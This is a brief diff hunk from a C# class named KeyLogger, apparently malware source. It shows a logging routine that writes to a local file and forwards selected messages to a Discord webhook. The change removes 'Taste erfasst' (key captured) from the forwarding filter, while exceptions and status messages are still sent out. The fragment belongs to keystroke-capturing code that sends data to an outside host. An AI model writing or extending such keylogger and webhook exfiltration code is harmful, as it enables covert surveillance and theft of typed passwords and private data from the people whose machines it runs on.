@@ -154,7 +154,7 @@ public static class KeyLogger
         {
             File.AppendAllText(_logFile, DateTime.Now.ToString("o") + ": " + message + Environment.NewLine);
             // Sende wichtige Logs an Discord
-            if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet") || message.Contains("Taste erfasst"))
+                        if (message.Contains("Exception") || message.Contains("initialisiert") || message.Contains("gesendet"))
             {
                 if (!string.IsNullOrEmpty(_hookUrl))
                 {
